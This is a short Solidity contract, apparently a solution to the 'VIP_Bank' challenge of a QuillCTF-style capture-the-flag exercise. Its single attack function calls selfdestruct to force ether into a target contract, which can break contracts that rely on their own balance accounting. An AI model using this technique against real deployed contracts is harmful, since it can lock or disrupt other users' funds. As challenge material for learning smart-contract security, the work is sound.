// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract VIP_BankQuillAttack{

    function attack(address payable target) public payable {
        selfdestruct(target);
    }

}